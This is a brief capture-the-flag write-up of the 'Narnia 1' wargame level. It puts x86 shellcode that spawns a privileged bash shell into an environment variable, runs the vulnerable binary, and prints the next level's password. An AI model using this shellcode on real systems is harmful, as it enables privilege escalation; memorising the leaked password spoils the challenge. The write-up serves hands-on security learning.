# Narnia 1

```
narnia1@narnia:/narnia$ ./narnia1
Give me something to execute at the env-variable EGG
```

We need a shellcode in the EGG env variable. After a few attempts I found one that worked

```
narnia1@narnia:/narnia$ export EGG=$(python -c 'print "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"')
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
bash-4.4$ whoami
narnia2
bash-4.4$ cat /etc/narnia_pass/narnia2
nairiepecu
```
